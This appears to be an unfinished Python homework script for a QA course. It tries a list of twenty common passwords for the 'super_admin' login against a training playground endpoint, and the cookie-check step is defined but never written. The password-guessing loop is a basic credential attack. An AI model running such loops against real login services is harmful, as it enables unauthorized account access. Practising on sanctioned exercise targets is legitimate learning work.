import requests

password_list = (123456, 123456789, 12345, 'qwerty', 'password', 12345678, 111111, 
                 123123, 1234567890, 1234567, 'qwerty123', 000000, '1q2w3e',
                 'aa12345678', 'abc123', 'password1', 1234, 'qwertyuiop', 123321,
                 'password123')

URL_1 = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
URL_2 = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

for password in password_list:
    r = requests.post(URL_1, data={'login': 'super_admin', 'password': password})
    
